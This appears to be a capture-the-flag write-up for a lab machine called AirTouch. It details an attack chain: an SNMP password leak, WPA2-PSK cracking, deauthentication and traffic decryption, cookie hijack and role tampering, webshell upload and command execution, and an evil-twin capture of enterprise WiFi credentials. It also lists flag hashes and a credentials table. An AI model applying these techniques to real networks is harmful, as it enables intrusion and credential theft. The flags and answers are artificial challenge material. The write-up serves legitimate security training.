# AirTouch — Report

**IP:** 10.129.18.57
**OS:** Linux (Ubuntu 20.04, multi-container Docker environment)
**Difficulty:** Hard

## Flags

| Flag | Hash |
|------|------|
| User | `b9391ac4dbdac3d098328e099c53b7a2` |
| Root | `97fb21a5c6dbb7efd11b1c85ea068b89` |

## Network Architecture

Three isolated VLANs bridged by WiFi access points:

```
Internet
   │
   ├── NAT :22→172.20.1.2:22, :161→172.20.1.2:161
   │
   ├─ [Consultant VLAN 172.20.1.0/24]
   │     └─ AirTouch-Consultant (Docker container, 172.20.1.2)
   │
   ├─ [Tablets VLAN 192.168.3.0/24]
   │     ├─ AirTouch-AP-PSK (192.168.3.1) — WiFi router + web panel
   │     └─ Tablet client (192.168.3.74)
   │        SSID: AirTouch-Internet (WPA2-PSK)
   │
   └─ [Corp VLAN 10.10.10.0/24]
         └─ AirTouch-AP-MGT (10.10.10.1) — Enterprise AP + RADIUS
            SSID: AirTouch-Office (WPA2-Enterprise 802.1X)
```

## Attack Chain

### 1. Foothold: SNMP Credential Disclosure

**Target:** 10.129.18.57:161/udp (SNMPv2c, community string `public`)
**Vulnerability:** Cleartext password in SNMP sysDescr field
**Impact:** SSH access as `consultant` with sudo root on Docker container

The SNMP sysDescr OID leaks a password in plaintext:

```
$ snmpwalk -v2c -c public 10.129.18.57
iso.3.6.1.2.1.1.1.0 = STRING: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
iso.3.6.1.2.1.1.4.0 = STRING: "admin@AirTouch.htb"
```

SSH login succeeds as `consultant:RxBlZhLmOkacNWScmZ6D`. The user has `sudo NOPASSWD: ALL` on the Docker container, granting immediate root.

### 2. WiFi Reconnaissance

The container has 7 wireless interfaces (wlan0-wlan6) with monitor mode and AP capabilities. `eaphammer` 1.14.0 is pre-installed with hostapd-mana/WPE patches.

WiFi scan revealed:
- **AirTouch-Internet** — WPA2-PSK, channel 6, BSSID f0:9f:c2:a3:f1:a7
- **AirTouch-Office** — WPA2-Enterprise (802.1X), channel 44 (5GHz), 2 BSSIDs, 2 active clients

### 3. WPA PSK Crack: AirTouch-Internet

**Vulnerability:** Weak WPA2-PSK passphrase
**Impact:** Access to Tablets VLAN (192.168.3.0/24)

Used `hcxdumptool` to capture a PMKID/handshake from AirTouch-Internet without needing an active client (clientless attack via eaphammer `--pmkid`). `hcxpcaptool` extracted 2 handshakes, and `aircrack-ng` cracked the PSK in seconds:

```
$ aircrack-ng handshakes.hccapx -w rockyou-combined.txt
KEY FOUND! [ challenge ]
```

Connected via `wpa_supplicant` and received DHCP address 192.168.3.84/24 on the Tablets VLAN.

### 4. Router Web Panel: WiFi Traffic Decryption + Session Hijack

**Target:** 192.168.3.1:80 — "WiFi Router Configuration" (Apache 2.4.41, PHP)
**Vulnerability:** Unencrypted HTTP on shared WiFi + insufficient session management
**Impact:** Session hijack of authenticated tablet user

The router web panel uses HTTP (no TLS). A tablet at 192.168.3.74 periodically authenticates and requests `/lab.php`. Since we know the WPA PSK, all WiFi traffic is decryptable.

**Step 1 — Capture handshake:** Deauthenticated the tablet (28:6c:07:fe:a3:22) to force reassociation, capturing the EAPOL 4-way handshake via `airodump-ng` in monitor mode.

**Step 2 — Decrypt traffic:** Used `airdecap-ng -p challenge -e AirTouch-Internet` to decrypt 98 WPA data packets. Scapy analysis extracted HTTP requests containing:

```
GET /lab.php HTTP/1.1
Cookie: PHPSESSID=j0st31j568ds83kqcph7uh540f; UserRole=user
```

**Step 3 — Session hijack:** Replayed the stolen session cookie to access the authenticated panel.

### 5. Privilege Escalation via Cookie IDOR

**Vulnerability:** Client-side role enforcement via `UserRole` cookie
**Impact:** Admin access to file upload functionality

The application trusts a client-set cookie `UserRole` to determine authorization. Changing it from `user` to `admin` exposes an admin-only file upload form:

```
$ curl -b "PHPSESSID=j0st31j568ds83kqcph7uh540f; UserRole=admin" http://192.168.3.1/index.php
...
<h3>Hello, manager (admin)!</h3>
<form action="index.php" method="post" enctype="multipart/form-data">
  <label for="file">Upload Configuration File:</label>
  <input type="file" name="fileToUpload" id="fileToUpload">
```

### 6. Unrestricted File Upload → RCE

**Vulnerability:** No file type validation on upload; `.phtml` executed as PHP
**Impact:** Remote code execution as `www-data` on AirTouch-AP-PSK

Uploaded a PHP webshell as `shell.phtml`. The `uploads/` directory allows direct access and PHP execution:

```
$ curl "http://192.168.3.1/uploads/shell.phtml?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 7. Hardcoded Credentials → Root on AirTouch-AP-PSK (user.txt)

**Vulnerability:** Plaintext credentials in PHP source code
**Impact:** Root access on the PSK router via `su` + sudo NOPASSWD

Reading `login.php` via the webshell revealed hardcoded credentials:

```php
$logins = array(
    /*'user' => array('password' => 'JunDRDZKHDnpkpDDvay', 'role' => 'admin'),*/
    'manager' => array('password' => '2wLFYNh4TSTgA5sNgT4', 'role' => 'user')
);
```

The commented-out `user` account password (`JunDRDZKHDnpkpDDvay`) works for `su user` on the router. This user has `sudo NOPASSWD: ALL`, giving full root access.

```
user.txt: b9391ac4dbdac3d098328e099c53b7a2
```

Root access also revealed:
- **CA certificate and server private key** for the AirTouch-Office enterprise WiFi in `/root/certs-backup/`
- **SSH credentials** for the enterprise AP in `/root/send_certs.sh`: `remote:xGgWEwqUpfoOVsLeROeG` to `10.10.10.1`

### 8. Evil Twin with Legitimate CA Certificate → MSCHAPv2 Capture

**Vulnerability:** Enterprise WiFi creds crackable via rogue AP with leaked CA cert
**Impact:** Captured domain credentials for AirTouch-Office users

With the real CA certificate and server key, the evil twin now passes TLS validation. Clients accept the certificate and complete Phase 2 (MSCHAPv2) authentication, which the WPE patches log:

```
$ eaphammer --creds -i wlan3 -e AirTouch-Office -c 44 --auth wpa-eap --hw-mode a

mschapv2: Sun Apr  5 06:19:26 2026
   username:     r4ulcl
   challenge:    5e:72:36:c7:75:9d:b6:69
   response:     54:38:1f:21:a6:0c:eb:91:d3:fb:b2:70:9e:a9:0b:7f:5e:a7:18:fb:6d:a2:ec:44
   jtr NETNTLM:  r4ulcl:$NETNTLM$5e7236c7759db669$54381f21a60ceb91d3fbb2709ea90b7f5ea718fb6da2ec44
```

Cracked with john using `darkc0de.txt` wordlist:

```
$ john hash.txt --wordlist=darkc0de.txt
laboratory       (r4ulcl)
```

### 9. Enterprise WiFi Authentication → Corp VLAN Access

Connected to AirTouch-Office as `AirTouch\r4ulcl` with PEAP-MSCHAPv2. Note: the domain prefix was required — `r4ulcl` alone was rejected by the RADIUS server.

```
wpa_state=COMPLETED
EAP state=SUCCESS
inet 10.10.10.50/24 (Corp VLAN)
```

### 10. RADIUS User Database → Root on AirTouch-AP-MGT (root.txt)

**Target:** 10.10.10.1 (AirTouch-AP-MGT)
**Vulnerability:** Plaintext credentials in RADIUS/hostapd EAP user file
**Impact:** Admin access with sudo NOPASSWD → root

SSH'd as `remote` (credentials from `send_certs.sh`). The `remote` user has no sudo, but the hostapd WPE EAP user file at `/etc/hostapd/hostapd_wpe.eap_user` is world-readable and contains:

```
"AirTouch\r4ulcl"    MSCHAPV2    "laboratory" [2]
"admin"              MSCHAPV2    "xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]
```

SSH'd as `admin` with the discovered password. This user has `(ALL) NOPASSWD: ALL`:

```
$ sudo cat /root/root.txt
97fb21a5c6dbb7efd11b1c85ea068b89
```

## Dead Ends

1. **Evil twin with self-signed certificate** — Both AirTouch-Office clients validate the CA certificate. Self-signed certs are rejected at TLS Phase 1 with `tlsv1 alert unknown ca`, preventing any credential capture. The real CA cert was needed.
2. **GTC downgrade attack** — Even with valid certs, clients refused to negotiate EAP-GTC, insisting on PEAP (method 25). The `--negotiate gtc-downgrade` flag in eaphammer was ineffective.
3. **Router login brute force** — 59K rockyou passwords, multiple usernames, SQLi, virtual hosts, API endpoints, cookie manipulation — all failed. The password (`2wLFYNh4TSTgA5sNgT4`) was a random string not in any wordlist.
4. **Direct Corp VLAN access** — 10.10.10.2 responds to ICMP from the Tablets VLAN but all 65535 TCP ports are filtered. Access required WiFi authentication to AirTouch-Office.
5. **SSH to Docker host** — 172.20.1.1:22 accessible intermittently but `consultant` creds rejected.

## Credentials

| Host | Service | Username | Password | Source |
|------|---------|----------|----------|--------|
| 10.129.18.57 | SSH | consultant | RxBlZhLmOkacNWScmZ6D | SNMP sysDescr |
| - | WiFi PSK | AirTouch-Internet | challenge | Handshake crack (rockyou) |
| 192.168.3.1 | Web login | manager | 2wLFYNh4TSTgA5sNgT4 | login.php source |
| 192.168.3.1 | su user | user | JunDRDZKHDnpkpDDvay | login.php source (commented out) |
| 10.10.10.1 | SSH | remote | xGgWEwqUpfoOVsLeROeG | send_certs.sh |
| - | WiFi 802.1X | AirTouch\r4ulcl | laboratory | MSCHAPv2 crack (darkc0de) |
| 10.10.10.1 | SSH | admin | xMJpzXt4D9ouMuL3JJsMriF7KZozm7 | hostapd_wpe.eap_user |

## Lessons Learned

1. **WiFi traffic decryption is trivial with a known PSK.** Once the WPA2-PSK passphrase is compromised, all traffic on the network is decryptable — including HTTP cookies, form submissions, and any other unencrypted protocols. Using HTTP (not HTTPS) on a WiFi-only management panel made this especially impactful.

2. **Client-side authorization checks are no authorization at all.** The `UserRole` cookie was set by the server but never validated server-side. Any user could escalate to admin by modifying a cookie value.

3. **Certificate and credential management is the weakest link in enterprise WiFi.** The entire WPA2-Enterprise security model collapsed once the CA private key was exposed on a less-protected system. The CA cert backup on the PSK router enabled the evil twin attack that captured domain credentials.

4. **RADIUS user files with plaintext passwords are high-value targets.** The hostapd EAP user file contained every enterprise WiFi credential in cleartext, including the admin account that provided root access.

5. **Network segmentation via WiFi alone is insufficient.** The Tablets VLAN could reach the Corp VLAN via ICMP (and partially via routing), and the PSK router stored CA certificates for the enterprise network. Compromise of the less-secure segment cascaded into full compromise of the enterprise segment.
